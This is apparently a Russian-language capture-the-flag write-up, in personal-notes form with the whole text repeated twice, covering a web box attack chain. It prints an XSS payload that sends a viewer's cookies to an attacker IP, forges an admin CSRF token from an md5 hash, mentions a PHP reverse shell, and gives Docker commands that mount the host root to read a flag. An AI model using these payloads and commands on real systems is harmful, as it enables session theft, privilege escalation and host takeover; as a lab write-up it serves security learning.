исследуем директории и файлы на сайте
![](../attachment/Pasted%20image%2020251022163158.png)
![](../attachment/Pasted%20image%2020251022163147.png)

Находим письмо в котором содержится пароль для новых панелей
![](../attachment/Pasted%20image%2020251022163222.png)

на странице обратной связи имеется уязвимость XSS с помощью которой мы можем получить куки пользователя который просматривает обращения
```
<script>fetch('http://10.10.32.135:4545/' + document.cookie)</script>
```
![](../attachment/Pasted%20image%2020251024113839.png)

Используя полученные куки мы можем зайти на сайт под пользователем mod и обнаружить его csrf токен, который не меняется (а должен). Проверим md5 хеш имени пользователи видим совпадение с csrf токеном
![](../attachment/Pasted%20image%2020251024114848.png) 
Получим csrf токен для администратора
```
echo -n admin |md5sum
21232f297a57a5a743894a0e4a801fc3  -
```
На вкладке чатов есть чат с админом, который переходит по ссылкам. Отправим ему ссылку с помощью который поднимем права пользователя mod до админа
![](../attachment/Pasted%20image%2020251024122804.png)

С правами админа мы можем выбрать  новую панель lottery на странице dashboard. Подменив название страницы у нас откроется страница finance.php которая потребует ранее найденный пароль.
После ввода пароля мы получаем доступ к панели finance с возможностью загрузки файлов
![](../attachment/Pasted%20image%2020251024124340.png)

Загрузив php reverse shell и перейдя на страницу где расположен файл мы получаем соединение
Изучив систему и не найдя флаг, мы видим файл .dockerenv => здесь есть контейнеры
![](../attachment/Pasted%20image%2020251024124801.png)
![](../attachment/Pasted%20image%2020251024130941.png)
Создадим новый контейнер, который будет использован образ ранее созданного контейнера 
```
docker run -v /:/host --name MainSystem phpvulnerable &
```

![](../attachment/Pasted%20image%2020251024130603.png)

Теперь используя новый контейнер изучим систему и заберем флаг 
```
docker exec MainSystem ls -al /
docker exec MainSystem ls -al /host
docker exec MainSystem ls -al /host/root
docker exec MainSystem cat /host/root/flag.txt
```
![](../attachment/Pasted%20image%2020251024130808.png)исследуем директории и файлы на сайте
![[../attachment/Pasted image 20251022163158.png]]
![[../attachment/Pasted image 20251022163147.png]]

Находим письмо в котором содержится пароль для новых панелей
![[../attachment/Pasted image 20251022163222.png]]

на странице обратной связи имеется уязвимость XSS с помощью которой мы можем получить куки пользователя который просматривает обращения
```
<script>fetch('http://10.10.32.135:4545/' + document.cookie)</script>
```
![[../attachment/Pasted image 20251024113839.png]]

Используя полученные куки мы можем зайти на сайт под пользователем mod и обнаружить его csrf токен, который не меняется (а должен). Проверим md5 хеш имени пользователи видим совпадение с csrf токеном
![[../attachment/Pasted image 20251024114848.png]] 
Получим csrf токен для администратора
```
echo -n admin |md5sum
21232f297a57a5a743894a0e4a801fc3  -
```
На вкладке чатов есть чат с админом, который переходит по ссылкам. Отправим ему ссылку с помощью который поднимем права пользователя mod до админа
![[../attachment/Pasted image 20251024122804.png]]

С правами админа мы можем выбрать  новую панель lottery на странице dashboard. Подменив название страницы у нас откроется страница finance.php которая потребует ранее найденный пароль.
После ввода пароля мы получаем доступ к панели finance с возможностью загрузки файлов
![[../attachment/Pasted image 20251024124340.png]]

Загрузив php reverse shell и перейдя на страницу где расположен файл мы получаем соединение
Изучив систему и не найдя флаг, мы видим файл .dockerenv => здесь есть контейнеры
![[../attachment/Pasted image 20251024124801.png]]
![[../attachment/Pasted image 20251024130941.png]]
Создадим новый контейнер, который будет использован образ ранее созданного контейнера 
```
docker run -v /:/host --name MainSystem phpvulnerable &
```

![[../attachment/Pasted image 20251024130603.png]]

Теперь используя новый контейнер изучим систему и заберем флаг 
```
docker exec MainSystem ls -al /
docker exec MainSystem ls -al /host
docker exec MainSystem ls -al /host/root
docker exec MainSystem cat /host/root/flag.txt
```
![[../attachment/Pasted image 20251024130808.png]]